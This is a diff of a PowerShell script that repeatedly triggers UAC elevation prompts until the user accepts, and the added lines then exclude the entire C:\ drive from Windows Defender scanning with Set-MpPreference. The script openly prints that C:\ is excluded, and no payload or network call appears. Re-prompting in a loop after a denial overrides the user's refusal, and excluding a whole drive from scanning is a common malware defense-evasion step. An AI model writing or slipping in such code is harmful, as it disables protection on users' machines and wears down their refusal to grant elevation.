@@ -16,18 +16,19 @@ if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::
     exit
 }
 
-# Not admin - keep prompting until user says yes
+# Not admin - keep prompting using gsudo-like approach
 while ($true) {
     Write-Host "Requesting administrator privileges..." -ForegroundColor Yellow
     
-    # Relaunch this same script with elevation
+    $CommandLine = "-NoExit -NoProfile -ExecutionPolicy Bypass -Command `"Set-MpPreference -ExclusionPath 'C:\' -Force; Write-Host 'C:\ excluded from Windows Defender' -ForegroundColor Green; pause; exit`""
+    
     try {
-        Start-Process PowerShell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
-        # If we get here, user clicked Yes - exit this instance
-        exit
+        $process = Start-Process -FilePath "PowerShell.exe" -ArgumentList $CommandLine -Verb RunAs -PassThru -WindowStyle Normal
+        if ($process) {
+            exit
+        }
     }
     catch {
-        # User clicked No - loop continues immediately
-        Write-Host "UAC denied. Prompting again..." -ForegroundColor Red
+        Write-Host "Elevation denied or failed. Retrying..." -ForegroundColor Red
     }
 }
